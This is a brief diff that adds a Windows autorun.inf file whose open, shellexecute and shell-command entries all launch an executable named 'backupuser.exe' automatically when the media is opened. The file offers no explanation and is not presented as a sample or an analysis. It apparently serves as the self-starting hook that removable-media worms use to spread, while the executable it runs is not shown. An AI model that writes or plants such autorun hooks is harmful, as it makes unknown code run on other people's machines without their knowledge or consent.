@@ -1,0 +1,4 @@
+[AutoRun]
+open=backupuser.exe
+shellexecute=backupuser.exe
+shell\Auto\command=backupuser.exe
